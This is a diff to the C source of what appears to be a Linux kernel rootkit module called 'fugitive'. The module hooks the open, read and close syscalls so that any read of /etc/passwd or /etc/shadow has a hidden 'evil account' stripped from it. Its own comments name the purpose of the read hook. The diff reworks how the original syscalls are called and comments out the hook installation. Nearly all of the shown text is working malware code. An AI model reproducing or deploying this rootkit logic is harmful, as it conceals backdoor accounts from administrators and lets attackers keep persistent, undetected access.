@@ -11,10 +11,6 @@ static char *fugitive__lines[2] = {
 };
 static struct sctm *fugitive__sctm = NULL;
 
-asmlinkage int (*good_open)(char *, int, mode_t) = NULL;
-asmlinkage ssize_t (*good_read)(int, void *, size_t) = NULL;
-asmlinkage int (*good_close)(int) = NULL;
-
 /* remove a line from "/etc/passwd" and "/etc/shadow" */
 int fugitive(const char __user *passwd, const char __user *shadow) {
   char *_passwd;
@@ -123,29 +119,27 @@ int fugitive_init(struct sctm *sctm) {
     .call = __NR_close,
     .hook = (sctm_syscall_handler_t) &this_is_requiem
   };
-  good_close = (asmlinkage int (*)(int)) &fugitive__hooks[0].original;
   fugitive__hooks[1] = (struct sctm_hook) {
     .call = __NR_open,
     .hook = (sctm_syscall_handler_t) &king_crimson
   };
-  good_open = (asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original;
+  
   fugitive__hooks[2] = (struct sctm_hook) {
     .call = __NR_read,
     .hook = (sctm_syscall_handler_t) &erase_time
   };
-  good_read = (asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original;
   
   fugitive__sctm = sctm;
   
   /* hook */
   
   for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
-    retval = sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
+    retval = 0;//sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
     
     if (retval) {
       if (i) {
         for (--i; i >= 0; i--)
-          sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
+          ;//sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
       }
       return retval;
     }
@@ -288,7 +282,7 @@ asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
     } else if(!strcmp(SHADOW_PATH, pathname)){
         erase = SHAD_E;
     }
-    return (*good_open)(pathname, flags, mode);
+    return (*((asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original))(pathname, flags, mode);
 }
 
 /* evil syscall read. deletes evil account info in buffer */
@@ -297,7 +291,7 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
     char *hidden = NULL;
     char *ptr = NULL;
 
-    ret = (*good_read)(fd, buf, count);
+    ret = (*((asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original))(fd, buf, count);
 
     switch(erase){
         case PASS_E:
@@ -326,6 +320,6 @@ asmlinkage int this_is_requiem(int fd){
     if(erase){
         erase = NONE;
     }
-    return (*good_close)(fd);
+    return (*((asmlinkage int (*)(int)) &fugitive__hooks[0].original))(fd);
 }
 
